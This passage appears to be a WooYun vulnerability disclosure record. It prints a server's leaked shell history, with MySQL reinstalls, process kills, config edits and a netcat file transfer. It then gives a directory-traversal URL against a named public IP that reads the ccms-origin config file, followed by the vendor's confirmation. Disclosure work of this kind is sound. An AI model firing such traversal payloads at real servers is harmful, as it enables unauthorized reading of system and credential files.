..#1426746921ls -lh#1426746927cd ccms-origin-1.3.1.5-centos-5-Linux-2.6.18-x86_64#1426746929ls -lh#1426746932cd ..#1426746934ls -lh#1426746940cd ccms-origin-1.3.4.5-centos-5-Linux-2.6.18-x86_64#1426746941ls -lh#1426746947vi mysql_install_manual.sh #1426746958vi mysql_install_manual.sh #1426746969./mysql_install_manual.sh #1426746980vi mysql_install_manual.sh #1426747002vi mysql_install_manual.sh #1426747447ls -lh /etc/ld.so.conf.d/#1426747474ls -lh /etc/ld.so.conf.d/#1426747618vi mysql_install_manual.sh #1426747683grep \"aaaa\" mysql_install_manual.sh#1426747688echo $?#1426747698grep \"mysql\" mysql_install_manual.sh#1426747703echo $?#1426747707vi mysql_install_manual.sh #1426748214ps -ef|grep mysql#1426748221rm -rf /usr/local/mysql/#1426748223ls -lh#1426748226./mysql_install_manual.sh #1426748236vi mysql_install_manual.sh #1426748258./mysql_install_manual.sh #1426748308vi mysql_install_manual.sh #1426748343ps -ef|grep mysql#1426748355kill -9 25553 25845#1426748360ps -ef|grep ccms#1426748370vi /etc/ld.so.conf#1426748376vi /etc/profile#1426748388rm -rf /usr/local/mysql/#1426748394./mysql_install_manual.sh #1426748665vi mysql_install_manual.sh #1426748753ps -ef|grep mysql#1426748762kill -9 26361 26648#1426748765./mysql_install_manual.sh #1426748772rm -rf /usr/local/mysql/#1426748774./mysql_install_manual.sh #1426748808vi ./mysql_install_manual.sh #1426748815ps -ef|grep mysql#1426748822mysql -u root -p#1426748835vi mysql_install_manual.sh #1426748897ps -ef|grep mysql#1426748903kill -9 28489 28891#1426748905ls -lh#1426748915rm -rf /usr/local/mysql/#1426748922./mysql_install_manual.sh #1426748945vi mysql_install_manual.sh #1426748957ps -ef|grep mysql#1426748960/usr/local/mysql/bin/mysql_install_db --user=mysql#1426749062ls /usr/local/mysql/libexec/#1426749122ls /usr/local/mysql#1426749126ls /usr/local/mysql/bin/#1426749141vi mysql_install_manual.sh #1426749232ps -ef|grep mysql#1426749240rm -rf /usr/local/mysql/#1426749247./mysql_install_manual.sh #1426749273ps -ef|grep mysql#1426749281mysql -u root -p#1426749299ls -lh#1426749348nc -l 9999 <  mysql_install_manual.sh #1426749352ifconfig|less#1426749357nc -l 9999 <  mysql_install_manual.sh #1426755958netstat -lntp#1426755962cd /usr/local/ccms#1426755963ls#1426755965cd origin#1426755966ls#1426755967cd logs/#1426755968ls#1426755969ll#1426755979/etc/init.d/ccms-origin version#1426756068/etc/init.d/ccms-origin version#1426756071netstat -lntp#1426756078vim /usr/local/ccms/origin/etc/ccms_origin.conf #1426756160vim /usr/local/ccms/origin/etc/ccms_origin.conf #1426756214vim /usr/local/ccms/origin/etc/ccms_origin.conf #1426756678ls#1426756681vim /usr/local/ccms/origin/etc/ccms_origin.conf #1426756694/etc/init.d/ccms-origin restart#1426756698netstat -lntp#1426756706ls#1426756708ll#1426756710ll#1426756711ll#1426756713ll#1426756716cd ..#1426756717ls#1426756723cd ..#1426756724ls#1426756730ll#1426756737cd /usr/local/ccms/origin.1426738504#1426756738ls#1426756741cd logs/#1426756741ls#1426756745cd ..#1426756746ls#1426756748cd etc/#1426756748ls#1426756754vim ccms_origin.conf#1426756792cp ccms_origin.conf   /usr/local/ccms/origin/etc/#1426756799/etc/init.d/ccms-origin restart#1426756804netstat -lntp#1426756846cd /usr/local/ccms/origin#1426756847ls#1426756848cd logs/#1426756848ls#1426756851ll#1426756855ll#1426756856ll#1426756856ll#1426756857ll#1426756857ll#1426756858ll#1426756858ll#1426756859ll#1426756859ll#1426756859ll#1426756860ll#1426756860ll#1426756860ll#1426757053ifconfig#1426757103ls#1426757109vim /usr/local/ccms/origin/etc/ccms_origin.conf #1426757123cd /data/cache1#1426757123ls#1426757129cd t.59find.com/#1426757129ls#1426757131cd live/#1426757131ls#1426757145cd 14267499180307t#1426757145ls#1426757150cd#1426757155netstat -lntp#1426821693netstat -lntp#1426821763ls#1426821767cd /usr/local/ccms/origin#1426821767ls#1426821768cd logs/#1426821769ls#1426821769ll#1426821774vim  20150319172000-Orginlog.log#1426821849vim /usr/local/ccms/origin/etc/ccms_origin.conf #1426821859cd /data/cache1#1426821859ls#1426821861cd t.59find.com/#1426821861ls#1426821863cd live/#1426821864ls#1426821881cd 14268200580307t#1426821881ls#1426821884cat index.m3u8#1426821910ls#1426821920vim  /usr/local/ccms/origin/etc/ccms_origin.conf #1426821932/etc/init.d/ccms-origin restart#1426821937vim  /usr/local/ccms/origin/etc/ccms_origin.conf #1426821983ls#1426821986ls#1426821987ls#1426822074cd ..#1426822075ls#1426822077cd 14268220420307t#1426822078ls#1426822113ifconfig#1426822143ls#1426822155netstat -lntp#1426822161vim /usr/local/nginx/conf/nginx.conf#1426822207vim  /usr/local/ccms/origin/etc/ccms_origin.conf #1426822218/etc/init.d/nginx.sh stop#1426822223/etc/init.d/ccms-origin restart#1426822569ls#1426822729cd ..#1426822730ls#1426822733cd 14268226720307t#1426822734ls#1426822994ls#1426822997cat index.m3u8#1426823000cat index.m3u8#1426823001cat index.m3u8#1426823001cat index.m3u8#1426823002cat index.m3u8#1426823966cd ..#1426823967ls#1426823969cd  14268237970307t#1426823970]ls#1426823971ls#1426823972ls#1426823974cat index.m3u8#1426824081cd#1426824082ls#1426824645cd /usr/local/#1426824646ls#1426824647cd ccms#1426824647ls#1426824649cd origin#1426824649ls#1426824650cd logs/#1426824651ls#1426824651ll#1426824659vim  20150320113023-Orginlog.log#1426824872vim /usr/local/ccms/origin/etc/ccms_origin.conf #1426824888/etc/init.d/ccms-origin restart#1426824926vim /usr/local/ccms/origin/etc/ccms_origin.conf #1426825122vim /usr/local/ccms/origin/etc/ccms_origin.conf #1426825151/etc/init.d/ccms-origin restart#1427342055netstat -lntp#1427342062vim /usr/local/ccms/origin/etc/ccms_origin.conf #1427342163ifconfig#1427342202vim /usr/local/ccms/origin/etc/ccms_origin.conf #1427342219/etc/init.d/ccms-origin reload#1429093672netstat -lntp\n各种配置文件日志等路径都有了，就不证明了   漏洞证明：  http://42.62.25.196/../../../../../../../../../../../../../../../../../usr/local/ccms/origin/etc/ccms_origin.conf   修复方案：  修改配置   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-27 14:20 厂商回复： 非常感谢，我们会尽快处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}